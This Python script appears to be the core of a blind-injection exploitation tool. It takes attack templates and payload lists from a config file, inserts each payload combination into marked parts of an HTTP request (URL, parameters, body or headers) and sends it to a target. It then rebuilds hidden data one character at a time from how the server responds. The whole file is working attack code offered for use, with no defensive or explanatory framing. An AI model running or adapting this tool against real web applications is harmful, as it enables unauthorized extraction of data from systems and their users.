#
# WARNING! Do not edit this file.
#

from config import *
from itertools import product
import logging
import requests

# configure logging
loglevel = getattr(logging, LOGLEVEL.upper())
logging.basicConfig(format='%(message)s', level=loglevel)
# configure debug logging for requests
if loglevel == logging.DEBUG:
    # debug HTTP requests
    import http.client as http_client
    http_client.HTTPConnection.debuglevel = 1
    # initialize logging, otherwise you'll not see debug output
    requests_log = logging.getLogger("requests.packages.urllib3")
    requests_log.setLevel(loglevel)
    requests_log.propagate = True

def main():
    exploit()

def exploit():
    # validate the configuration values
    try:
        ATTACKS[ATTACK]['injection'].format(*range(0, len(PAYLOADS)))
    except IndexError:
        logging.error('[!] Number of payloads and insertion points do not match.')
        return
    # process the configuration values
    attack = ATTACKS[ATTACK]
    # show the scan metadata
    logging.info('*'*50)
    logging.info('Description: {}'.format(attack['description']))
    logging.info('Injection: {}'.format(attack['injection']))
    for i in range(0, len(PAYLOADS)):
        logging.info('Payload{}: {}'.format(i, repr(PAYLOADS[i])))
    logging.info('*'*50)
    # do eeeeet!
    logging.info('Exploiting...')
    result = recurse(attack, PAYLOADS, URL, PARAMS, DATA, HEADERS)
    logging.warning('Result: {}'.format(result))

def inject(arg, injection):
    '''
    dynamically places the injection in a marked HTTP request element
    '''
    # url, params, or data
    if type(arg) == str:
        if '*' in arg:
            return arg.replace('*', injection)
    # header
    elif type(arg) == dict:
        for k, v in arg.items():
            if '*' in v:
                arg[k] = v.replace('*', injection)
    return arg

def recurse(attack, payloads, url, params, data, headers, i=0, payload={}, result=''):
    '''
    recurses through a dynamic number of payload iterables injecting into the associated insertion point
    '''
    for p in payloads[i]:
        payload[i] = p
        # recurse to the outermost iterable
        if i < len(payloads)-1:
            i+=1
            result = recurse(attack, payloads, url, params, data, headers, i, payload, result)
            i-=1
            continue
        # process the payload
        _payload = tuple(payload.values())
        logging.debug('[*] {}'.format(_payload))
        # build the injection
        injection = attack['injection'].format(*_payload)
        # build the request
        action = requests.post if DATA else requests.get
        resp = action(
            url=inject(url, injection),
            params=inject(params, injection),
            data=inject(data, injection),
            headers=inject(headers, injection),
        )
        # process the response
        if condition(_payload, resp, i):
            char = found(_payload, resp, i)
            logging.info('[!] {} {}'.format(_payload, char))
            result += char
            return result
    return result

if __name__ == '__main__':
    main()
